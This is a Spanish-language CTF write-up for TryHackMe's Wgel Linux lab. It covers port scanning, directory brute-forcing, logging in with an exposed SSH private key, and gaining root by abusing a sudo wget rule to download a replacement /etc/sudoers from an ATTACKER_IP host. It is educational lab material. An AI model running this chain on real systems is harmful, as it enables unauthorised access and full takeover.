# 🐧 Wgel CTF — Writeup

> Plataforma: TryHackMe
> Dificultad: Fácil
> Sistema: Linux
> Tipo: Enumeración Web + SSH + Privilege Escalation

---

## 🎯 Objetivo

Obtener acceso inicial a la máquina y escalar privilegios hasta root.

---

## 🌐 Reconocimiento

Primero verificamos conectividad:

```
ping -c 4 TARGET_IP
```

La máquina responde correctamente → host activo.

---

## 🔎 Escaneo de Puertos

Escaneo completo:

```
sudo nmap -p- --open -sS -Pn -n --min-rate 5000 TARGET_IP
```

**Puertos encontrados**

| Puerto | Servicio |
| ------ | -------- |
| 22     | SSH      |
| 80     | HTTP     |

---

## 🌍 Enumeración Web

El sitio muestra la página por defecto de Apache.

Esto normalmente indica:

> El contenido real está oculto en directorios.

Fuerza bruta de directorios:

```
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

Resultado importante:

```
/sitemap
```

---

## 📂 Descubrimiento Crítico

Dentro de `/sitemap` encontramos una carpeta oculta:

```
/sitemap/.ssh/id_rsa
```

Descargamos la clave privada:

```
wget http://TARGET_IP/sitemap/.ssh/id_rsa
chmod 600 id_rsa
```

---

## 🔐 Acceso Inicial (SSH)

Intentamos autenticarnos:

```
ssh -i id_rsa jessie@TARGET_IP
```

✔ Acceso conseguido.

---

## 🧠 Enumeración Interna

Verificamos permisos sudo:

```
sudo -l
```

Resultado clave:

```
(root) NOPASSWD: /usr/bin/wget
```

Esto significa:

> Podemos ejecutar wget como root sin contraseña

---

## 🚀 Privilege Escalation

La idea:
Sobrescribir `/etc/sudoers` con uno modificado.

En nuestra máquina atacante creamos:

```
jessie ALL=(ALL) NOPASSWD: ALL
```

Levantamos servidor:

```
sudo python3 -m http.server 80
```

En la víctima:

```
sudo /usr/bin/wget http://ATTACKER_IP/sudoers -O /etc/sudoers
```

---

## 👑 Root

Ahora:

```
sudo su
```

✔ Root obtenido.

---

## 🏁 Flags

| Usuario | Estado    |
| ------- | --------- |
| User    | Capturada |
| Root    | Capturada |

---

## 🧩 Lecciones Aprendidas

* Siempre buscar archivos `.ssh` expuestos
* Apache default page casi siempre oculta contenido real
* Permisos sudo con binarios → casi siempre escalada
* `wget` puede usarse para sobrescribir archivos críticos

---

## 🧠 Conceptos Practicados

* Enumeración web
* Uso de Gobuster
* Abuso de claves privadas
* Escalada por sudo mal configurado

---

## 📌 Resumen de Ataque

```
Recon → Dir Busting → SSH Key → Shell → Sudo Misconfig → Root
```

---

📝 *Writeup educativo. Sin flags reales publicadas.*
